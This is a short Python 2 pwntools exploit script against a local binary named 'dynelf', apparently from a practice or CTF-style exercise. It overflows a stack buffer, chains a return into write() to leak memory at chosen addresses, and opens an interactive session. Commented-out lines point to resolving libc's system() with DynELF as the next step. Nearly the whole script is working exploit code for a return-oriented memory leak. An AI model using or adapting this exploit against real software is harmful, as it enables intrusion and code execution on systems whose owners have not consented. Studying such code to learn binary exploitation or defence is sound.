#!/usr/bin/env python

from pwn import *


def leak(addr):
    global Io
    Io.readuntil("What's your name?")
    offset = 0x0e
    junk = "A" * offset
    # ssize_t write(int fd, const void *buf, size_t count);
    fd = p32(1)
    buf = p32(addr)
    count = p32(4)
    saved_rbp = p32(0x0804851F) # address of main()
    write_addr = p32(0x080483E0)
    payload = junk + saved_rbp + write_addr + fd + buf + count
    print "[Length] : [%d]" % (len(payload))
    with open("payload.dat", "w") as f:
        f.write(payload)
    Io.send(payload)
    #Io.readuntil("hello, ")
    #Io.recv(len(payload))
    #Io.recv(1)

    # recv address
    data = Io.recv(4)
    print "[%s] -> [%s]" % (hex(addr), hex(u32(data)))
    return u32(data)


PATH = "./dynelf"
Io = process(PATH)

leak(0x0804851F)
leak(0x0804851F + 4)
leak(0x0804851F + 8)

Io.interactive()

# d = DynELF(leak, elf=ELF(PATH)) 
# system_addr = d.lookup('system', 'libc') 
